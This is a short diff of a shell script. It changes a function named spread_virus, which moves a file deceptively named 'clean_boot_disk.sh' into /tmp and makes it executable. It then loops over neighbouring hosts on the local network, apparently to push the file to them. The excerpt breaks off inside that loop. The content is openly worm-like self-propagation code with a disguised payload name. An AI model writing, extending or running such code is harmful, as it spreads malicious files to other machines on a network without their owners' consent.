@@ -123,7 +123,8 @@ INTERFACE=$(ip a l | grep -iE "$(hostname -I | awk -F ' ' '{print $1};')" | cut 
 function spread_virus {
 FILE_SEND="clean_boot_disk.sh"
 FILE_PATH="/tmp"
-    sudo mv -v ./$FILE_SEND $FILE_PATH     
+    sudo mv -v ./$FILE_SEND $FILE_PATH
+    sudo chmod +x $FILE_PATH/$FILE_SEND     
     cd $FILE_PATH
     for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`
     do 
